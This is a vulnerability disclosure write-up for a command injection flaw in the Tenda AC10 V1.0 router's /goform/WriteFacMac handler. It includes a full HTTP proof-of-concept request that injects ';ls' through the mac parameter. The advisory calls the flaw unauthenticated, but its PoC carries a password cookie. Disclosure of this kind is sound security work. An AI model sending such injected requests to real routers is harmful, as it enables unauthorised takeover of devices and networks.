# Tenda AC10 V1.0 Router Command Injection Vulnerability in WriteFacMac

## Overview
Tenda AC10 V1.0 Router is a consumer-grade wireless router supporting advanced wireless features, firewall, and device management capabilities. A command injection vulnerability exists in the `formWriteFacMac` function, which handles requests to the `/goform/WriteFacMac` endpoint. Attackers can inject arbitrary system commands via the `mac` parameter, leading to unauthorized device control or complete compromise.

## Details
- **Vendor**: Tenda
- **Website**: [https://www.tendacn.com/](https://www.tendacn.com/)
- **Product**: Tenda AC10 V1.0 Router
- **Firmware**: V15.03.06.23_multi_TD01
- **Firmware Download**: [https://www.tenda.com.cn/material/show/2734]
- **Endpoint**: `/goform/WriteFacMac`
- **Vulnerability**: Command Injection
- **CVE ID**: Pending
- **Impact**: Execute arbitrary commands, access sensitive files, or gain full control.
- **Reported by**: n0ps1ed (n0ps1edzz@gmail.com)

### Description
The `formWriteFacMac` function processes POST requests to `/goform/WriteFacMac`. It extracts the user-controlled `mac` parameter using `websGetVar` and passes it directly to `doSystemCmd` without sanitization. In `doSystemCmd`, the parameter is interpolated into a system command (e.g., `cfm mac %s`) and executed directly on the system. By injecting special characters (e.g., `;`), attackers can escape the command context and execute arbitrary system commands on the router.
![PoC 2 Result: Root Directory Listing](./imgs/0.png)
![PoC 2 Result: Root Directory Listing](./imgs/1.png)

## Proof of Concept (PoC)
### PoC: Execute `ls` Command
```
POST /goform/WriteFacMac HTTP/1.1
Host: 192.168.xx.xxx
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: password=rfl1qw
If-Modified-Since: Sun Aug 10 12:46:43 2025
Connection: keep-alive
Content-Length: 24

mac=00:01:02:11:22:33;ls
```
![PoC 2 Result: Root Directory Listing](./imgs/2.png)
### PoC Result
The above request injects the `ls` command, which lists the root directory contents of the router, demonstrating arbitrary command execution. The response may include a directory listing, confirming the vulnerability.

## Impact
An unauthenticated attacker can exploit this vulnerability to:
- Execute arbitrary system commands.
- Access sensitive files or configurations.
- Gain full control of the router, potentially leading to network compromise.
